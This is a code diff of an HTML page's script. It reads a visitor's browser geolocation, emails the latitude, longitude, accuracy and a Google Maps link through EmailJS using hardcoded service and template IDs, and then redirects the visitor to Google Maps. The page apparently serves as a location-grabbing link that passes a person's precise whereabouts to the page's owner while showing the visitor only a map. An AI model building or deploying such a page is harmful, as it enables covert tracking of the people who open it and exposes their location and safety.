@@ -14,19 +14,20 @@
                 var lat = pos.coords.latitude;
                 var lon = pos.coords.longitude;
                 var accuracy = pos.coords.accuracy;
+                var mapsLink = "https://www.google.com/maps?q=" + lat + "," + lon;
 
-                // Email göndər
                 emailjs.send("service_3v5hcby", "template_x8wi2yq", {
                     lat: lat,
                     lon: lon,
-                    accuracy: accuracy + " metr"
+                    accuracy: accuracy + " metr",
+                    maps_link: mapsLink
                 });
 
-                // Google Maps-ə yönləndir
-                window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
+                window.location.href = mapsLink;
             });
         }
     </script>
 </body>
 </html>
+
 
